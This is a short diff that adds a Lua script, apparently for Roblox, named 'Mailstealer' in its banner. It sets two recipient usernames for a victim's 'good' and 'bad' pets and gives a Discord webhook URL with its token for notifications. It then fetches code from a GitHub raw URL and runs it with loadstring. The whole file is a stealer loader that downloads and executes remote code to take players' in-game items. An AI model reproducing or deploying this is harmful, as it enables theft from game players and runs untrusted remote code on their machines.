@@ -1,0 +1,17 @@
+--[[
+  __  __                _     _  _  _          __  __         _  _       _                _             
+ |  \/  |              | |   (_)| || |        |  \/  |       (_)| |     | |              | |            
+ | \  / |  __ _  _   _ | | __ _ | || | ______ | \  / |  __ _  _ | | ___ | |_  ___   __ _ | |  ___  _ __ 
+ | |\/| | / _` || | | || |/ /| || || ||______|| |\/| | / _` || || |/ __|| __|/ _ \ / _` || | / _ \| '__|
+ | |  | || (_| || |_| ||   < | || || |        | |  | || (_| || || |\__ \| |_|  __/| (_| || ||  __/| |   
+ |_|  |_| \__,_| \__, ||_|\_\|_||_||_|        |_|  |_| \__,_||_||_||___/ \__|\___| \__,_||_| \___||_|   
+                  __/ |                                                                                 
+                 |___/                                                                                        
+]]--
+
+UserName = "Lampz_xpz" -- all good pets
+UserName2 = "Lampz_xpz" -- all bad pets
+Webhook = "https://discord.com/api/webhooks/1163101873906143273/dc60l-BUE6LA2SmRODwJJgBzpl2fGjCJCFScwQmphfgy0Ul4MLJcSJtUxEQPHuPaVXL7" -- discord webhook for notifications
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Maykill-Scripts/Mailstealer/main/v1.1"))()
